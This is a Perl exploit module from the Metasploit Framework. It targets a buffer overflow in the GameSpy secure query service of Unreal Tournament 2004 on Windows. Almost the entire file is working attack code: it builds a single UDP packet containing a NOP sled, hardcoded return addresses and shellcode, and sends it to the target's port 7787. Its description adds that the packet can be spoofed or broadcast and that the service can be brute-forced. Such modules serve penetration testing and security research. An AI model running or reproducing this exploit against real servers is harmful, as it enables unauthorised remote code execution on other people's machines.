
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::unreal_tournament_2k4;
use base "Msf::Exploit";
use strict;

my $advanced = { };
my $info =
{
    'Name'  => 'Unreal Tournament 2004 Secure Query Overflow',
    'Version'  => '$Revision$',
    'Authors' => [ 'Stinko', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 0,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 7787],
                },

    'Payload' => {
		     'Space' => 512,
                 'BadChars'  => "\x5c\x00",
                 },
    
    'Description'  =>  qq{
      This is an exploit for the GameSpy secure query in the Unreal Engine.

      This exploit only requires one UDP packet, which can be both spoofed
      and sent to a broadcast address. Usually, the GameSpy query server listens
      on port 7787, but you can manually specify the port as well.

      The Unreal Engine exception handler will recover the process, giving
      us the ability to brute force the service and exploit it multiple
      times. 
    },
    'Refs'  =>  [ 'http://www.osvdb.org/7217',
			'http://www.securityfocus.com/bid/10570' ],            
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    
    my $request = ("\x90" x 1024);
    #substr($request, 0, 60, (pack("V", 0x71ae1f9c) x 15));
    substr($request, 0, 60, (pack("V", 0x10184be3) x 15));
    #substr($request, 0, 60, (pack("V", 0x1018145b) x 15));

    substr($request, 56, 4, "\xe4\xf0\xfd\x7f");    
    substr($request, 0, length("\\secure\\"), "\\secure\\");    
    substr($request, length($request) - length($shellcode), length($shellcode), $shellcode); 	

    my $sock = Msf::Socket::Udp->new(
        'PeerAddr' => $target_host,
        'PeerPort' => $target_port,
    );
    if($sock->IsError) {
        $self->PrintLine('Error creating socket: ' . $sock->GetError);
        return;
    }

    $self->PrintLine('[*] Sending UDP Secure Request (Dest Port: ' . $target_port . ') (' . length($request) . ' bytes)');
  
    if(!$sock->Send($request)) {
      $sock->PrintError;
      return;
    }

    return;
}

1;
